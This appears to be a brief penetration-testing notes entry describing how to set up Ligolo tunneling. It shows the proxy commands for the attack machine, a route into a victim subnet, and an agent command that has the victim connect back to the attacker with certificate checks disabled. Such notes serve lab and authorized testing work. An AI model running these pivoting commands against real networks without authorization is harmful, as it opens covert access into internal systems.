### Ligolo Tunneling - Port Forwarding

**Get the Ligolo Proxy and the Agent executables**
1. On the attack machine:
```bash
sudo ip tuntap adduser hutgrabber mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:443 [any port and loopback]
# in another window:
sudo ip route add [victim subnet]/CIDR dev ligolo
start
```

2. On the victim machine:
```powershell
./agent -connect [attack ip]:[port] -ignore-cert
```


